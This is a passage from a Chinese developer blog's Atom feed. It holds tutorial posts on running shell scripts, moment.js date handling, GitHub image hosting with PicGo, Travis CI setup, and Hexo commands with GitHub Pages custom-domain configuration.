所要执行的脚本具体命令了。</li></ol><h4 id="运行Shell脚本"><a href="#运行Shell脚本" class="headerlink" title="运行Shell脚本"></a>运行Shell脚本</h4><p>有两种方式：</p><h5 id="1-作为可执行程序"><a href="#1-作为可执行程序" class="headerlink" title="1. 作为可执行程序"></a>1. 作为可执行程序</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ chmod +x example.sh    # 使脚本具有执行权限</span><br><span class="line">$ .&#x2F;example.sh           # 执行脚本</span><br></pre></td></tr></table></figure><h5 id="2-作为解释器参数"><a href="#2-作为解释器参数" class="headerlink" title="2. 作为解释器参数"></a>2. 作为解释器参数</h5><p>这种运行方式是，直接运行解释器，其参数就是shell脚本的文件名:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 执行脚本</span><br><span class="line">$ &#x2F;bin&#x2F;sh example.sh</span><br><span class="line">$ bash example.sh</span><br><span class="line">$ bash example.php</span><br></pre></td></tr></table></figure><p>使用这种方式时，可以不用在脚本第一行声明解释器信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ cat example.php</span><br><span class="line">#这是一个用php写的Shell脚本，有两个作用</span><br><span class="line">#1.确认是否用解释器参数执行shell脚本可以不用写声明</span><br><span class="line">#2.确认如何用php写shell脚本</span><br><span class="line">string&#x3D;&quot;php shell&quot;</span><br><span class="line">echo $string</span><br><span class="line">$ bash example.php</span><br><span class="line">php shell</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;如标题所示，这片笔记主要目的是加深对&lt;code&gt;Linux&lt;/code&gt;的&lt;code&gt;Shell&lt;/code&gt;、&lt;code&gt;Shell脚本&lt;/code&gt;、&lt;code&gt;Shell环境&lt;/code&gt;的理解。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="学习笔记" scheme="https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Shell" scheme="https://www.0x2beace.com/tags/Shell/"/>
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>moment.js 用法总结</title>
    <link href="https://www.0x2beace.com/moment-js-usage-summary/"/>
    <id>https://www.0x2beace.com/moment-js-usage-summary/</id>
    <published>2020-07-07T10:59:32.000Z</published>
    <updated>2020-07-08T16:31:53.649Z</updated>
    
    <content type="html"><![CDATA[<p>最近在做的一个前端项目，经常会遇到对时间的处理，因为原生的时间格式处理起来很费劲，所以引入了一个轻量级的日期处理类库。</p><p><a href="http://momentjs.cn/" target="_blank" rel="noopener">momentjs</a> 支持日期格式化、Date、时间戳等相互转换，它使得操作时间变得非常简单。</p><a id="more"></a><h3 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h3><p><code>momentjs</code>支持多个环境，所有的代码都应该在这两种环境中都可以工作。</p><h4 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install moment</span><br><span class="line">var moment &#x3D; require(&#39;moment&#39;);</span><br></pre></td></tr></table></figure><h4 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;moment.js&#x2F;2.9.0&#x2F;moment.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>获取当前的日期和时间：</p><h4 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moment();</span><br></pre></td></tr></table></figure><p>相当于moment(new Date()) 此处会返回一个moment封装的<strong>日期对象</strong>。</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200707190535.png" alt=""></p><h4 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">moment().format(&#39;YYYY年MM月DD日 HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020年07月07日 07:49:38&quot;</span><br><span class="line">moment().format(&#39;YYYY-MM-DD HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020-07-07 07:50:57&quot;</span><br><span class="line">moment().format(&#39;YYYY&#x2F;MM&#x2F;DD HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020&#x2F;07&#x2F;07 07:51:17&quot;</span><br><span class="line">moment().format(&#39;hh:m:ss&#39;) &#x2F;&#x2F; &quot;07:51:34&quot;</span><br><span class="line">moment().format(&#39;YYYY&#39;) &#x2F;&#x2F; &quot;2020&quot;</span><br><span class="line">moment().format(&#39;d&#39;) &#x2F;&#x2F; 2，今天是周二</span><br><span class="line">moment().format(&#39;X&#39;) &#x2F;&#x2F; 获取当前时间的Unix时间戳</span><br></pre></td></tr></table></figure><h4 id="转换为Date对象"><a href="#转换为Date对象" class="headerlink" title="转换为Date对象"></a>转换为Date对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">moment().toDate() &#x2F;&#x2F; Mon Jan 22 2018 18:11:55 GMT+0800 (中国标准时间)</span><br><span class="line">moment(&#39;2018-01-20&#39;).toDate() &#x2F;&#x2F; Tue Jan 20 2015 00:00:00 GMT+0800 (中国标准时间)</span><br><span class="line">moment(&#39;2018-01-22 10:20:15&#39;).toDate() &#x2F;&#x2F; Mon Jan 22 2018 10:20:15 GMT+0800 (中国标准时间)</span><br><span class="line">moment(1448896064621).toDate() &#x2F;&#x2F;毫秒转日期</span><br></pre></td></tr></table></figure><h4 id="获取时间信息"><a href="#获取时间信息" class="headerlink" title="获取时间信息"></a>获取时间信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">moment().second() &#x2F;&#x2F; 获取当前这一分钟的多少秒</span><br><span class="line">moment().date() &#x2F;&#x2F; 获取天</span><br><span class="line">moment().day()  &#x2F;&#x2F; 获取星期</span><br><span class="line">moment().dayOfYear()  &#x2F;&#x2F; 一年内的多少天</span><br><span class="line">moment().week() &#x2F;&#x2F; 一年里的多少周</span><br><span class="line">moment().month()  &#x2F;&#x2F; 获取当前月份（实际月份-1）</span><br><span class="line">moment().quarter() &#x2F;&#x2F; 一年内的第几个季度</span><br><span class="line">moment().year() &#x2F;&#x2F; 获取年份</span><br><span class="line">moment().daysInMonth() &#x2F;&#x2F; 获取当月天数</span><br></pre></td></tr></table></figure><h4 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h4><p>一旦解析和操作完成后，需要某些方式来显示 moment。</p><p>使用<code>format</code>来格式化日期：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">moment().format() &#x2F;&#x2F; &quot;2020-07-07T08:24:35+08:00&quot;</span><br><span class="line">moment.unix(timestamp).format(&#39;YYYY-MM-DD HH:mm:ss&#39;);   &#x2F;&#x2F; 将Unix 时间戳转换为日期格式</span><br><span class="line">moment(timestamp).format(&#39;YYYY-MM-DD HH:mm:ss&#39;);   &#x2F;&#x2F; 将Unix 毫秒时间戳转换为日期格式</span><br><span class="line">moment().unix();        &#x2F;&#x2F; 获取Unix 时间戳</span><br><span class="line">moment().format(&quot;X&quot;);   &#x2F;&#x2F; 获取Unix 时间戳</span><br><span class="line">moment().format(&quot;x&quot;);   &#x2F;&#x2F; 获取Unix 毫秒时间戳</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在做的一个前端项目，经常会遇到对时间的处理，因为原生的时间格式处理起来很费劲，所以引入了一个轻量级的日期处理类库。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://momentjs.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;momentjs&lt;/a&gt; 支持日期格式化、Date、时间戳等相互转换，它使得操作时间变得非常简单。&lt;/p&gt;</summary>
    
    
    
    <category term="前端" scheme="https://www.0x2beace.com/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="JavaScript" scheme="https://www.0x2beace.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>如何选择一个适合自己的图床</title>
    <link href="https://www.0x2beace.com/how-to-choose-a-picture-bed-that-suits-you/"/>
    <id>https://www.0x2beace.com/how-to-choose-a-picture-bed-that-suits-you/</id>
    <published>2020-07-06T15:06:33.000Z</published>
    <updated>2020-07-10T05:36:37.965Z</updated>
    
    <content type="html"><![CDATA[<p>因为没有把博客部署在服务器上，而是选择GitHub Pages 的方式，所以如果遇到需要插入图片的时候，只能通过图床来存储图片。</p><p>如果不是因为<a href="https://sm.ms/" target="_blank" rel="noopener">SM.MS</a> 图床在今天突然挂掉了，我可能都不会去想是否需要更换图床这个问题。</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200706225801.png" alt=""></p><p>于是我开始寻找一个免费、稳定的图床，最后在众多图床中，最后选择了GitHub 图床。</p><p>使用GitHub 图床，可能唯一的问题是需要自备好科学上网工具，否则图片无法加载。</p><a id="more"></a><blockquote><p>为什么不选择国内的那些图床服务？</p></blockquote><p>我只是想存一些图片，而国内的大部分图床服务，还需要做域名备案以及绑定各种服务，感觉很繁琐，加上我的域名不是在国内的域名服务商那里买的，索性就没有考虑国内的图床服务。</p><h3 id="图床管理工具"><a href="#图床管理工具" class="headerlink" title="图床管理工具"></a>图床管理工具</h3><p>有了图床，就需要顺手配置一个图床管理工具，这里我选择的是 <a href="https://github.com/Molunerfinn/PicGo" target="_blank" rel="noopener">PicGo</a>，仅目前支持的图床就有：SM.MS图床，微博图床，七牛图床，腾讯云COS，阿里云OSS，Imgur，又拍云，GitHub 图床等。</p><h3 id="创建GitHub-图床"><a href="#创建GitHub-图床" class="headerlink" title="创建GitHub 图床"></a>创建GitHub 图床</h3><p>首先，你得有一个<a href="https://github.com/" target="_blank" rel="noopener">GitHub</a> 账号。</p><h4 id="1-新建一个仓库"><a href="#1-新建一个仓库" class="headerlink" title="1. 新建一个仓库"></a>1. 新建一个仓库</h4><p>这个仓库是用于存储图片，最好是public，因为private的仓库，图片链接会带token，而这个token会存在过期的问题。</p><h4 id="2-获取授权token"><a href="#2-获取授权token" class="headerlink" title="2. 获取授权token"></a>2. 获取授权token</h4><p>通过<code>Settings-&gt;Developer settings-&gt;Personal access tokens</code> <a href="https://github.com/settings/tokens/new" target="_blank" rel="noopener">创建一个新的token</a> 用于PicGo操作你的仓库。</p><p>把repo的勾打上即可，点击Generate token的绿色按钮生成 token。</p><p>创建成功后，会生成一串token，这串token之后不会再显示，所以第一次看到的时候最好保存好。</p><h3 id="配置PicGo"><a href="#配置PicGo" class="headerlink" title="配置PicGo"></a>配置PicGo</h3><p>GitHub 图床的配置还是比较简单的，下面是参数说明。</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200706225324.png" alt=""></p><ul><li>仓库名：你的图床仓库的名称，格式为：<code>username/repository</code></li><li>分支名：一般选择默认分支 <code>master</code></li><li>Token：刚才生成的 Token</li><li>存储路径：指定存放在仓库的哪个目录下</li><li>自定义域名：<code>raw.githubusercontent.com/username/repository/branch</code></li></ul><p>自定义域名最好按照一定的规则去定义：<code>raw.githubusercontent.com</code>+你的github用户名+仓库名称+分支名称</p><blockquote><p><code>raw.githubusercontent.com</code> 是github用来存储用户上传文件的服务地址，是github 的素材服务器 (assets server)。</p></blockquote><p>通常配置完成之后，就可以直接使用了。</p><p>如果你上传失败的情况，可以打开PicGo 的日志看看具体是什么异常</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200706220223.png" alt=""></p><p>如果得到了这样的异常，那么大概率是因为你没有开启全局代理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[PicGo ERROR] RequestError: Error: connect ECONNREFUSED 13.250.168.23:443&#96;</span><br></pre></td></tr></table></figure><p>因为GitHub 服务器和国内 GFW 的问题会导致有时上传成功，有时上传失败，所以需要自备好科学上网工具。</p><p>如果你还有其他问题，可以查阅 <a href="https://github.com/Molunerfinn/PicGo/blob/dev/FAQ.md" target="_blank" rel="noopener">PicGo FAQ</a>。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>如果你和我一样，讨厌域名备案，又希望能有一个免费、稳定的图床，那么一定不要错过GitHub 图床。</li><li>如果你只是需要存储一些不怎么重要的图片，那么可以使用免费不限大小的SM.MS图床。</li><li>如果打算长期稳定使用可以优先选择又拍云或者七牛云。</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;因为没有把博客部署在服务器上，而是选择GitHub Pages 的方式，所以如果遇到需要插入图片的时候，只能通过图床来存储图片。&lt;/p&gt;
&lt;p&gt;如果不是因为&lt;a href=&quot;https://sm.ms/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;SM.MS&lt;/a&gt; 图床在今天突然挂掉了，我可能都不会去想是否需要更换图床这个问题。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200706225801.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;于是我开始寻找一个免费、稳定的图床，最后在众多图床中，最后选择了GitHub 图床。&lt;/p&gt;
&lt;p&gt;使用GitHub 图床，可能唯一的问题是需要自备好科学上网工具，否则图片无法加载。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    <category term="Skill" scheme="https://www.0x2beace.com/categories/Tutorial/Skill/"/>
    
    <category term="GitHub" scheme="https://www.0x2beace.com/categories/Tutorial/Skill/GitHub/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
  </entry>
  
  <entry>
    <title>Travis CI 快速上手</title>
    <link href="https://www.0x2beace.com/travis-ci-quick-start/"/>
    <id>https://www.0x2beace.com/travis-ci-quick-start/</id>
    <published>2020-07-05T06:25:58.000Z</published>
    <updated>2020-07-09T13:12:54.040Z</updated>
    
    <content type="html"><![CDATA[<p>最近使用Github Pages 搭建Hexo 时，用到了一项新技术。hmm…也不能说是新技术吧，只是之前一直有听说，但却没有实际用过。</p><p>它就是持续集成，听上去好像是一个高大上的概念，但通俗一点解释就是：写完代码提交之后，会根据你的要求，自动做编译测试。</p><p>其中最出名大概就是<a href="https://travis-ci.com/" target="_blank" rel="noopener">Travis CI</a>了，本文的目的就是快速入门 Travis CI。</p><a id="more"></a><h2 id="什么是持续集成？"><a href="#什么是持续集成？" class="headerlink" title="什么是持续集成？"></a>什么是持续集成？</h2><p>持续集成(Continuous Integration)是对小周期的的代码进行更改，其目的是通过以较小的增量开发和测试来构建更健康的软件。</p><p>而Travis CI 作为一个持续集成平台，通过自动构建和测试代码，并提供更改成功的即时反馈。</p><h3 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h3><p>在正式开始之前，需要提前准备好以下先决条件：</p><ul><li>一个 <a href="https://github.com/" target="_blank" rel="noopener">GitHub</a> 帐户</li><li>托管在 <a href="https://github.com/" target="_blank" rel="noopener">Github</a> 的项目的所有者权限</li></ul><p>需要注意的是：Travis CI不是完全免费的服务，前100个私有构建是免费的，后续就要进行付费，如果你的项目是开源的，或者你是学生，则不受限制。</p><h4 id="在Github-上使用Travis-CI"><a href="#在Github-上使用Travis-CI" class="headerlink" title="在Github 上使用Travis CI"></a>在Github 上使用Travis CI</h4><ol><li>将 <a href="https://github.com/marketplace/travis-ci" target="_blank" rel="noopener">Travis CI</a> 添加到你的 GitHub 账户中。</li><li>前往 GitHub 的 <a href="https://github.com/settings/installations" target="_blank" rel="noopener">Applications settings</a>，配置 Travis CI 权限，使其能够访问你的 repository。</li><li>前往 GitHub 新建 <a href="https://github.com/settings/tokens" target="_blank" rel="noopener">Personal Access Token</a>，只勾选 repo 的权限并生成一个新的 Token。Token 生成后请复制并保存好。</li><li>回到 Travis CI，前往你的 repository 的设置页面，在 Environment Variables 下新建一个环境变量，Name 为 GH_TOKEN，Value 为刚才你在 GitHub 生成的 Token。确保 DISPLAY VALUE IN BUILD LOG 保持 不被勾选 避免你的 Token 泄漏。点击 Add 保存。</li><li>在你的项目中新建一个 <code>.travis.yml</code> 文件。</li><li>提交并推送以触发Travis CI构建。</li></ol><p>其中<code>.travis.yml</code>文件的目的是告诉 Travis CI 应该做些什么。</p><p>以下示例指定了应使用Ruby 2.2和最新版本的JRuby构建的Ruby项目。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">language: ruby</span><br><span class="line">rvm:</span><br><span class="line"> - 2.2</span><br><span class="line"> - jruby</span><br></pre></td></tr></table></figure><p>通过访问<a href="https://travis-ci.com/auth" target="_blank" rel="noopener">Travis CI</a> 并选择repository，检查构建状态页面，以根据构建命令的返回状态查看构建是否通过或失败。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近使用Github Pages 搭建Hexo 时，用到了一项新技术。hmm…也不能说是新技术吧，只是之前一直有听说，但却没有实际用过。&lt;/p&gt;
&lt;p&gt;它就是持续集成，听上去好像是一个高大上的概念，但通俗一点解释就是：写完代码提交之后，会根据你的要求，自动做编译测试。&lt;/p&gt;
&lt;p&gt;其中最出名大概就是&lt;a href=&quot;https://travis-ci.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Travis CI&lt;/a&gt;了，本文的目的就是快速入门 Travis CI。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="CI" scheme="https://www.0x2beace.com/tags/CI/"/>
    
  </entry>
  
  <entry>
    <title>Hexo 快速上手</title>
    <link href="https://www.0x2beace.com/hexo-quick-start/"/>
    <id>https://www.0x2beace.com/hexo-quick-start/</id>
    <published>2020-07-05T06:16:31.000Z</published>
    <updated>2020-08-15T01:05:05.993Z</updated>
    
    <content type="html"><![CDATA[<p>最近使用Hexo 搭建了一套博客系统，整个过程还算顺利，不过还是遇到了一些问题，整理记录一下。</p><a id="more"></a><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>新建一个网站。如果没有设置 <code>folder</code>，Hexo 默认在目前的文件夹建立网站。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init [folder]</span><br></pre></td></tr></table></figure><h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><p>layout 有三种选择：</p><ul><li>post：新建一片文章</li><li>page：新建一个页面</li><li>draft：新建一篇草稿</li></ul><p>如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure><h3 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h3><p>生成静态文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br><span class="line">&#x2F;&#x2F; 等效于 hexo g</span><br></pre></td></tr></table></figure><p>常用参数：<br>|选项|描述|<br>|-|-|<br>|-d, –deploy|文件生成后立即部署网站|<br>|-w, –watch|监视文件变动|<br>|-b, –bail|生成过程中如果发生任何未处理的异常则抛出异常|</p><h3 id="publish"><a href="#publish" class="headerlink" title="publish"></a>publish</h3><p>发表草稿</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo publish [layout] &lt;filename&gt;</span><br></pre></td></tr></table></figure><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p>启动服务器。默认情况下，访问网址为： <code>http://localhost:4000/</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br><span class="line">&#x2F;&#x2F; 等效于 hexo s</span><br></pre></td></tr></table></figure><h3 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h3><p>部署网站。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br><span class="line">&#x2F;&#x2F; 等效于 hexo d</span><br></pre></td></tr></table></figure><p><code>-g</code>，<code>--generate</code>：部署之前预先生成静态文件</p><h3 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h3><p>清除缓存文件 (db.json) 和已生成的静态文件 (public)。</p><p>在某些情况（尤其是更换主题后），如果发现对站点的更改无论如何也不生效，那可能需要运行该命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br></pre></td></tr></table></figure><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p>列出网站资料。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo list</span><br></pre></td></tr></table></figure><h3 id="version"><a href="#version" class="headerlink" title="version"></a>version</h3><p>显示 Hexo 版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo version</span><br></pre></td></tr></table></figure><h3 id="其他模式"><a href="#其他模式" class="headerlink" title="其他模式"></a>其他模式</h3><h4 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h4><p>在安全模式下，不会载入插件和脚本。当需要安装新插件遭遇问题时，可以尝试以安全模式重新执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --safe</span><br></pre></td></tr></table></figure><h4 id="调试模式"><a href="#调试模式" class="headerlink" title="调试模式"></a>调试模式</h4><p>在终端中显示调试信息并记录到 debug.log。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --debug</span><br></pre></td></tr></table></figure><h4 id="显示草稿"><a href="#显示草稿" class="headerlink" title="显示草稿"></a>显示草稿</h4><p>显示 source/_drafts 文件夹中的草稿文章。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --draft</span><br></pre></td></tr></table></figure><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="CNAME-文件被删除"><a href="#CNAME-文件被删除" class="headerlink" title="CNAME 文件被删除"></a>CNAME 文件被删除</h3><p>GitHub Pages 为我们免费提供了<code>&lt;username&gt;.github.io</code>这样的域名作为 GitHub Page，但如果你觉得这个域名太长了，不满意，那么你也可以绑定自己的域名。</p><p>通常绑定完成之后，会在项目目录下面生成一个叫做<code>CNAME</code>的文件，这个文件的作用就是用来记录GitHub Pages 所绑定的域名。</p><p>这个时候就会产生一个问题：</p><blockquote><p>CNAME文件会在每次 hexo deploy 时消失，然后需要重新手动绑定，这样就很繁琐。</p></blockquote><p>有以下几种方式可以解决这个问题：</p><ol><li>每次 <code>hexo d</code> 之后，就去 GitHub 仓库根目录新建 CNAME文件。—— 繁琐</li><li>在 <code>hexo g</code> 之后， <code>hexo d</code> 之前，把CNAME文件复制到 <code>public</code> 目录下面，里面写入你要绑定的域名。—— 繁琐</li><li>将需要上传至 GitHub 的内容放在<code>source</code>文件夹，例如CNAME、favicon.ico、images等，这样在 <code>hexo d</code> 之后就不会被删除了。</li><li>通过安装插件实现永久保留。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-generator-cname --save</span><br></pre></td></tr></table></figure><p>编辑<code>_config.yml</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Plugins:</span><br><span class="line">- hexo-generator-cname</span><br></pre></td></tr></table></figure><p>推荐第三种方式，简单方便。</p><h3 id="配置apex-域"><a href="#配置apex-域" class="headerlink" title="配置apex 域"></a>配置apex 域</h3><p>Github Pages 是支持绑定自己的私有域名的，但默认只能绑定 <code>CNAME</code>的私有子域名，那有没有办法主域名呢？</p><p>答案是有的。</p><p>如果绑定主域名，例如 example.com，建议还设置一个 <code>www</code> 子域，GitHub Pages 将自动在域之间创建重定向，当输入<code>example.com</code>时，会重定向到 <code>www.example.com</code>。</p><p>通常我们绑定好私有子域名之后，回生成一个<code>CNAME</code>的文件，里面记录着我们绑定好的私有子域名。</p><p>此时只需要去DNS 做解析，创建一个ALIAS、ANAME 或 A 记录：</p><ul><li>创建ALIAS、ANAME记录：将 apex 域指向站点的默认域。</li><li>创建A 记录：将 apex 域指向 GitHub Pages 的 IP 地址。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; GitHub Pages 的 IP 地址</span><br><span class="line">185.199.108.153</span><br><span class="line">185.199.109.153</span><br><span class="line">185.199.110.153</span><br><span class="line">185.199.111.153</span><br></pre></td></tr></table></figure><p>这里我选择的是创建A 记录，所以我的DNS 解析是这样的：</p><p><img src="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/20200706203008.png" alt="DNS解析A记录"></p><p>配置完DNS 解析之后，可以使用<code>dig</code>命令来检验是否解析成功：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ dig example.com +noall +answer</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; 0x2BeAce.com +noall +answer</span><br><span class="line">;; global options: +cmd</span><br><span class="line">0x2BeAce.com.4502INA185.199.111.153</span><br><span class="line">0x2BeAce.com.4502INA185.199.110.153</span><br><span class="line">0x2BeAce.com.4502INA185.199.108.153</span><br><span class="line">0x2BeAce.com.4502INA185.199.109.153</span><br></pre></td></tr></table></figure><p>将example.com 替换成你自己的 apex 域，确认结果与上面 GitHub Pages 的 IP 地址相匹配。</p><p>至此，就完成了apex 域的配置了。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/chengxs/p/7496265.html" target="_blank" rel="noopener">github+hexo搭建自己的博客网站（七）注意事项</a></li><li><a href="https://hexo.io/zh-cn/docs/commands" target="_blank" rel="noopener">Hexo | 指令</a></li><li><a href="https://docs.github.com/cn/github/working-with-github-pages/managing-a-custom-domain-for-your-github-pages-site#configuring-an-apex-domain" target="_blank" rel="noopener">管理 GitHub Pages 站点的自定义域</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近使用Hexo 搭建了一套博客系统，整个过程还算顺利，不过还是遇到了一些问题，整理记录一下。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Hexo" scheme="https://www.0x2beace.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Github Pages 部署 Hexo 个人博客</title>
    <link href="https://www.0x2beace.com/deploy-hexo-using-github-pages-personal-blog/"/>
    <id>https://www.0x2beace.com/deploy-hexo-using-github-pages-personal-blog/</id>
    <published>2020-07-04T12:09:09.000Z</published>
    <updated>2020-08-15T01:11:07.291Z</updated>
    
